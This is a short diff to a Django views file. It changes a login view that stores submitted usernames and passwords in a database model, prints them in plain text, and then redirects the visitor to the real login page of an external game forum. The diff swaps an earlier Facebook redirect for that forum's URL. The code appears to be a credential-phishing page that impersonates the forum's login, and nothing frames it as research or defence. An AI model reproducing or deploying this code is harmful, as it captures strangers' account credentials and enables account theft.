@@ -1,7 +1,7 @@
 from django.shortcuts import render,redirect
 from .models import Usera
-def test(request):
-    return render(request,'login.html')
+def diendan(request):
+    return render(request,'diendan.html')
 def login(request):
     if request.method == 'POST':
         username = request.POST.get('username')
@@ -13,8 +13,8 @@ def login(request):
             print(user.username, user.password)
             user.save()
             print("Succesfully")                                
-            return redirect('https://facebook.com')
+            return redirect('https://forum.ngocrongonline.com/app/index.php?do=login')
     context ={
     }
-    return render(request,'diendan.html',context)
+    return render(request,'login.html',context)
 # Create your views here.
